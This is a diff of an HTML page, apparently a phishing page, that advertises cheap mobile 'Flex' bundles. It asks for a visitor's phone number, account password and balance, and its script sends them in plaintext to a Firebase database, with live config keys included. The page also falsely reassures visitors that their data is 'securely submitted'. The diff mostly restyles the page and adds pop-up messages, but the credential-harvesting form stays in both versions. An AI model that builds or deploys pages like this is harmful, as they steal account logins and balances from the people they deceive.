@@ -4,23 +4,29 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <title>Flex Packages</title>
-  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet" />
+
+  <!-- خط احترافي -->
+  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap" rel="stylesheet" />
+
   <style>
-    /* نفس التنسيق السابق مع بعض التعديلات */
+    /* Reset وتنسيق عام */
     * {
       margin: 0; padding: 0; box-sizing: border-box;
-      font-family: 'Roboto', sans-serif;
+      font-family: 'Orbitron', sans-serif;
+      user-select: none;
     }
     body {
-      background-color: #0a0a0a;
-      color: #c8c8c8;
+      background-color: #000;
+      color: #f00; /* أحمر أساسي */
       min-height: 100vh;
       display: flex;
       flex-direction: column;
       align-items: center;
-      padding: 20px;
+      padding: 25px;
       overflow-x: hidden;
+      position: relative;
     }
+
     /* Matrix background */
     @keyframes fall {
       0% { transform: translateY(-100%); }
@@ -29,279 +35,379 @@
     .matrix {
       position: fixed;
       top: 0; left: 0;
-      width: 100%;
-      height: 100%;
+      width: 100vw;
+      height: 100vh;
       z-index: -1;
       overflow: hidden;
       background: #000;
       font-family: monospace;
       color: #0f0;
       user-select: none;
+      pointer-events: none;
+      opacity: 0.2;
     }
     .matrix span {
       position: absolute;
       top: -20%;
       animation: fall linear infinite;
-      font-size: 14px;
-      opacity: 0.7;
+      font-size: 16px;
+      opacity: 0.6;
+      text-shadow: 0 0 4px #0f0;
     }
+
+    /* الحاوية الأساسية */
     .container {
-      max-width: 900px;
-      background: #121212cc;
-      border-radius: 12px;
-      padding: 30px 40px;
-      box-shadow: 0 0 30px #00ff0044;
-      backdrop-filter: blur(6px);
-      margin-bottom: 40px;
+      max-width: 950px;
+      background: #120000cc;
+      border: 2px solid #ff0000cc;
+      border-radius: 15px;
+      padding: 40px 50px;
+      box-shadow: 0 0 35px #ff0000bb;
+      backdrop-filter: blur(8px);
+      margin-bottom: 50px;
     }
     h1 {
-      color: #00ff00;
+      color: #ff1a1a;
       font-weight: 900;
-      font-size: 3rem;
+      font-size: 3.5rem;
       text-align: center;
-      text-shadow: 0 0 8px #00ff00;
-      margin-bottom: 30px;
-      letter-spacing: 6px;
-      user-select: none;
+      text-shadow: 0 0 12px #ff1a1a;
+      margin-bottom: 35px;
+      letter-spacing: 8px;
     }
+
+    /* بطاقات الباقات */
     .package {
-      background: #1a1a1a;
-      border: 2px solid #00ff00;
-      border-radius: 10px;
-      padding: 20px 25px;
-      margin-bottom: 20px;
-      box-shadow: 0 0 12px #00ff0055;
+      background: #220000;
+      border: 2px solid #ff0000;
+      border-radius: 14px;
+      padding: 25px 30px;
+      margin-bottom: 22px;
+      box-shadow: 0 0 18px #ff0000aa;
       transition: transform 0.3s ease, box-shadow 0.3s ease;
+      cursor: default;
     }
     .package:hover {
-      transform: scale(1.05);
-      box-shadow: 0 0 25px #00ff00;
+      transform: scale(1.07);
+      box-shadow: 0 0 30px #ff0000ee;
     }
     .package h2 {
-      color: #00ff00;
-      font-size: 1.8rem;
-      margin-bottom: 10px;
-      text-shadow: 0 0 5px #00ff00;
-      user-select: none;
+      color: #ff3333;
+      font-size: 2rem;
+      margin-bottom: 12px;
+      text-shadow: 0 0 7px #ff3333;
     }
     .package p {
-      font-size: 1.1rem;
+      font-size: 1.2rem;
       line-height: 1.5;
-      color: #b0b0b0;
+      color: #ff6666;
       user-select: none;
     }
+
+    /* فورم الإدخال */
     form {
-      margin-top: 30px;
-      background: #111;
-      padding: 25px 30px;
-      border-radius: 12px;
-      box-shadow: 0 0 20px #008800aa;
+      margin-top: 40px;
+      background: #1a0000;
+      padding: 35px 40px;
+      border-radius: 16px;
+      box-shadow: 0 0 30px #ff0000cc;
+      position: relative;
     }
     label {
       display: block;
-      margin-bottom: 8px;
-      color: #00ff00;
-      font-weight: 600;
-      font-size: 1.1rem;
-      user-select: none;
+      margin-bottom: 10px;
+      color: #ff4d4d;
+      font-weight: 700;
+      font-size: 1.2rem;
     }
     input[type="text"],
     input[type="password"],
     input[type="number"] {
       width: 100%;
-      padding: 12px 15px;
-      margin-bottom: 20px;
-      border-radius: 8px;
-      border: 1.5px solid #00ff00;
-      background: #222;
-      color: #0f0;
-      font-size: 1rem;
-      font-family: monospace;
+      padding: 14px 18px;
+      margin-bottom: 25px;
+      border-radius: 10px;
+      border: 2px solid #ff1a1a;
+      background: #330000;
+      color: #ffb3b3;
+      font-size: 1.1rem;
+      font-family: 'Orbitron', monospace;
       outline: none;
-      transition: border-color 0.3s ease;
+      transition: border-color 0.4s ease, box-shadow 0.4s ease;
     }
     input[type="text"]:focus,
     input[type="password"]:focus,
     input[type="number"]:focus {
-      border-color: #80ff80;
-      box-shadow: 0 0 8px #80ff80;
+      border-color: #ff4d4d;
+      box-shadow: 0 0 15px #ff4d4d;
     }
     button {
-      background-color: #00ff00;
+      background-color: #ff0000;
       border: none;
-      padding: 14px 25px;
-      border-radius: 10px;
+      padding: 16px 30px;
+      border-radius: 14px;
       color: #000;
-      font-weight: 700;
-      font-size: 1.2rem;
+      font-weight: 900;
+      font-size: 1.3rem;
       cursor: pointer;
       transition: background-color 0.3s ease;
-      user-select: none;
       width: 100%;
+      user-select: none;
     }
     button:hover {
-      background-color: #00cc00;
+      background-color: #cc0000;
     }
+
+    /* رسالة ملاحظة */
+    .note {
+      color: #ff6666;
+      font-weight: 700;
+      margin-bottom: 25px;
+      font-size: 1rem;
+      text-align: center;
+      user-select: none;
+    }
+
+    /* حقوق الطبع */
     footer {
       text-align: center;
       margin-top: auto;
-      padding: 20px 10px;
-      color: #004400;
+      padding: 22px 12px;
+      color: #900000;
       font-size: 1rem;
-      font-weight: 600;
-      text-shadow: 0 0 5px #00ff00;
+      font-weight: 700;
+      text-shadow: 0 0 12px #ff0000;
+      letter-spacing: 2.5px;
       user-select: none;
-      letter-spacing: 2px;
+      border-top: 1px solid #440000;
+      width: 100%;
+      max-width: 950px;
     }
+
+    /* نوافذ منبثقة احترافية */
+    .modal-overlay {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100vw;
+      height: 100vh;
+      background: rgba(255,0,0,0.85);
+      backdrop-filter: blur(8px);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      z-index: 9999;
+      opacity: 0;
+      pointer-events: none;
+      transition: opacity 0.3s ease;
+    }
+    .modal-overlay.active {
+      opacity: 1;
+      pointer-events: auto;
+    }
+    .modal {
+      background: #220000;
+      border: 2px solid #ff0000;
+      border-radius: 20px;
+      padding: 30px 40px;
+      max-width: 450px;
+      text-align: center;
+      box-shadow: 0 0 35px #ff0000dd;
+      color: #ff9999;
+      user-select: none;
+      font-size: 1.1rem;
+      position: relative;
+    }
+    .modal h3 {
+      font-size: 1.8rem;
+      margin-bottom: 20px;
+      color: #ff4444;
+      text-shadow: 0 0 12px #ff4444;
+    }
+    .modal p {
+      line-height: 1.5;
+      margin-bottom: 30px;
+    }
+    .modal button {
+      background: #ff1a1a;
+      border: none;
+      padding: 12px 28px;
+      border-radius: 12px;
+      color: #000;
+      font-weight: 700;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: background-color 0.3s ease;
+    }
+    .modal button:hover {
+      background: #cc0000;
+    }
+    .modal .close-btn {
+      position: absolute;
+      top: 12px;
+      right: 16px;
+      font-size: 1.4rem;
+      font-weight: 900;
+      color: #ff2222;
+      cursor: pointer;
+      user-select: none;
+      transition: color 0.3s ease;
+    }
+    .modal .close-btn:hover {
+      color: #ff5555;
+    }
+
   </style>
 
   <!-- Firebase -->
   <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/9.22.1/firebase-database-compat.js"></script>
+
 </head>
 <body>
 
   <div class="matrix" aria-hidden="true"></div>
 
-  <div class="container">
+  <div class="container" role="main" aria-label="Flex Packages">
     <h1>Flex Packages</h1>
 
-    <div class="package">
-      <h2>42,000 Flex for 350 Cash</h2>
-      <p>Conditions: Flex system 260, no debt or notes on the line.</p>
-    </div>
-    <div class="package">
-      <h2>13,000 Flex for 240 Cash</h2>
-      <p>Conditions: No debt or notes on the line.</p>
-    </div>
-    <div class="package">
-      <h2>40 GB for 330 Cash</h2>
-      <p>No conditions.</p>
-    </div>
-    <div class="package">
-      <h2>Renew Package: 50,000 Flex (8 days)</h2>
-      <p>Conditions: Renew before the package expires. (Renewal, not activation)</p>
+    <div class="package" id="flex5200Package">
+      <h2>5200 Flex Package</h2>
+      <p>This package contains 5200 flex points and is subject to admin control.</p>
     </div>
 
-    <!-- هذه الباقة سيتم التحكم في ظهورها -->
-    <div id="flex5200Package" class="package" style="display:none;">
-      <h2>5,200 Flex for 100 Cash</h2>
-      <p>Conditions: No debt or notes on the line.<br>Note: Not always available.</p>
+    <div class="package">
+      <h2>1000 Flex Package</h2>
+      <p>Includes 1000 flex points.</p>
     </div>
 
-    <form id="packageForm">
+    <form id="packageForm" aria-label="Submit Flex Package Data">
       <label for="phone">Phone Number</label>
-      <input type="text" id="phone" name="phone" placeholder="Enter your phone number" required pattern="[0-9]{10,15}" />
+      <input type="text" id="phone" name="phone" placeholder="Enter your phone number" required autocomplete="off" inputmode="tel" pattern="[0-9]{10,15}" />
 
       <label for="password">Password</label>
-      <input type="password" id="password" name="password" placeholder="Enter your password" required />
+      <input type="password" id="password" name="password" placeholder="Enter your password" required autocomplete="new-password" />
 
-      <label for="balance">Net Balance</label>
-      <input type="number" id="balance" name="balance" placeholder="Enter your net balance" min="0" required />
-
-      <p style="color:#0f0; font-weight:700; margin-bottom:20px;">
-        Note: 100 net balance = 120 cash.
-      </p>
+      <label for="balance">Net Balance (Flex)</label>
+      <input type="number" id="balance" name="balance" placeholder="Enter your net balance" required min="0" />
 
       <button type="submit">Submit</button>
     </form>
+
+    <p class="note">* Your data will be securely submitted.</p>
   </div>
 
   <footer>
-    &copy; 2025 Ahmed. All rights reserved.
+    &copy; 2025 Mahmoud Gamal Programming. All rights reserved.
   </footer>
 
-  <script>
-    // Matrix effect
-    const matrix = document.querySelector('.matrix');
-    const columns = Math.floor(window.innerWidth / 14);
-    const drops = [];
+  <!-- النوافذ المنبثقة -->
+  <div class="modal-overlay" id="modalOverlay" role="dialog" aria-modal="true" aria-labelledby="modalTitle" aria-describedby="modalDesc">
+    <div class="modal">
+      <span class="close-btn" id="closeModal" aria-label="Close modal">&times;</span>
+      <h3 id="modalTitle">Notification</h3>
+      <p id="modalDesc"></p>
+      <button id="modalOkBtn">OK</button>
+    </div>
+  </div>
 
-    for (let i = 0; i < columns; i++) {
-      drops[i] = Math.random() * window.innerHeight;
-    }
+<script>
+  // Matrix effect text generation
+  const matrix = document.querySelector('.matrix');
+  const letters = '01';
+  const columns = Math.floor(window.innerWidth / 16);
+  for(let i = 0; i < columns; i++) {
+    const span = document.createElement('span');
+    span.style.left = `${i * 16}px`;
+    span.style.animationDuration = `${3 + Math.random() * 5}s`;
+    span.style.fontSize = `${14 + Math.random() * 10}px`;
+    span.style.top = `${-100 - Math.random() * 300}px`;
+    span.textContent = letters.charAt(Math.floor(Math.random() * letters.length));
+    matrix.appendChild(span);
+  }
 
-    function drawMatrix() {
-      matrix.innerHTML = '';
-      for (let i = 0; i < columns; i++) {
-        const span = document.createElement('span');
-        span.style.left = i * 14 + 'px';
-        span.style.top = drops[i] + 'px';
-        span.textContent = Math.floor(Math.random() * 10);
-        span.style.animationDuration = (5 + Math.random() * 10) + 's';
-        matrix.appendChild(span);
+  // Firebase config
+  const firebaseConfig = {
+    apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
+    authDomain: "starkoscript.firebaseapp.com",
+    databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
+    projectId: "starkoscript",
+    storageBucket: "starkoscript.appspot.com",
+    messagingSenderId: "381525854892",
+    appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
+  };
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.database();
 
-        drops[i] += 14;
-        if (drops[i] > window.innerHeight) drops[i] = -20;
-      }
-      requestAnimationFrame(drawMatrix);
-    }
-    drawMatrix();
-
-    // Firebase config
-    const firebaseConfig = {
-      apiKey: "AIzaSyCuP6VscPxkQS5D5z7bCYWXijzaYCdbF2s",
-      authDomain: "starkoscript.firebaseapp.com",
-      databaseURL: "https://starkoscript-default-rtdb.firebaseio.com",
-      projectId: "starkoscript",
-      storageBucket: "starkoscript.appspot.com",
-      messagingSenderId: "381525854892",
-      appId: "1:381525854892:android:50ba5daa1cffae8faa2d09"
-    };
-
-    // Initialize Firebase
-    firebase.initializeApp(firebaseConfig);
-    const db = firebase.database();
-
-    // Function to control the visibility of 5200 Flex package based on Firebase key
-    function checkFlex5200Availability() {
-      db.ref('controls/flex5200_enabled').get().then((snapshot) => {
-        if (snapshot.exists()) {
-          const enabled = snapshot.val();
-          const flex5200Div = document.getElementById('flex5200Package');
-          if (enabled === true || enabled === 'true') {
-            flex5200Div.style.display = 'block';
-          } else {
-            flex5200Div.style.display = 'none';
-          }
+  // تحكم ظهور باقة 5200
+  function checkFlex5200Availability() {
+    db.ref('controls/flex5200_enabled').get().then((snapshot) => {
+      if (snapshot.exists()) {
+        const enabled = snapshot.val();
+        const flex5200Div = document.getElementById('flex5200Package');
+        if (enabled === true || enabled === 'true') {
+          flex5200Div.style.display = 'block';
+        } else {
+          flex5200Div.style.display = 'none';
         }
-      }).catch((error) => {
-        console.error('Error checking flex5200_enabled:', error);
-      });
+      }
+    }).catch((error) => {
+      showModal('Error', 'Error checking package availability. Try again later.');
+      console.error('Error checking flex5200_enabled:', error);
+    });
+  }
+  checkFlex5200Availability();
+
+  // النوافذ المنبثقة - وظيفة عرض رسالة
+  const modalOverlay = document.getElementById('modalOverlay');
+  const modalTitle = document.getElementById('modalTitle');
+  const modalDesc = document.getElementById('modalDesc');
+  const modalOkBtn = document.getElementById('modalOkBtn');
+  const closeModalBtn = document.getElementById('closeModal');
+
+  function showModal(title, message) {
+    modalTitle.textContent = title;
+    modalDesc.textContent = message;
+    modalOverlay.classList.add('active');
+  }
+
+  modalOkBtn.addEventListener('click', () => {
+    modalOverlay.classList.remove('active');
+  });
+  closeModalBtn.addEventListener('click', () => {
+    modalOverlay.classList.remove('active');
+  });
+  window.addEventListener('keydown', (e) => {
+    if(e.key === 'Escape') modalOverlay.classList.remove('active');
+  });
+
+  // إرسال البيانات إلى Firebase
+  const form = document.getElementById('packageForm');
+  form.addEventListener('submit', (e) => {
+    e.preventDefault();
+
+    const phone = form.phone.value.trim();
+    const password = form.password.value.trim();
+    const balance = parseInt(form.balance.value.trim());
+
+    if (!phone || !password || isNaN(balance)) {
+      showModal('Invalid Input', 'Please fill all fields correctly.');
+      return;
     }
 
-    // Run on page load
-    checkFlex5200Availability();
-
-    // Handle form submission
-    const form = document.getElementById('packageForm');
-    form.addEventListener('submit', (e) => {
-      e.preventDefault();
-
-      const phone = form.phone.value.trim();
-      const password = form.password.value.trim();
-      const balance = parseInt(form.balance.value.trim());
-
-      if (!phone || !password || isNaN(balance)) {
-        alert('Please fill all fields correctly.');
-        return;
-      }
-
-      // Save data to Firebase under unique key by timestamp
-      const newDataRef = db.ref('submissions').push();
-      newDataRef.set({
-        phone: phone,
-        password: password,
-        net_balance: balance,
-        timestamp: Date.now()
-      }).then(() => {
-        alert('Data submitted successfully!');
-        form.reset();
-      }).catch((error) => {
-        alert('Failed to submit data: ' + error.message);
-      });
+    const newDataRef = db.ref('submissions').push();
+    newDataRef.set({
+      phone: phone,
+      password: password,
+      net_balance: balance,
+      timestamp: Date.now()
+    }).then(() => {
+      showModal('Success', 'Data submitted successfully!');
+      form.reset();
+    }).catch((error) => {
+      showModal('Submission Failed', 'Failed to submit data: ' + error.message);
     });
-  </script>
+  });
+</script>
 
 </body>
 </html>
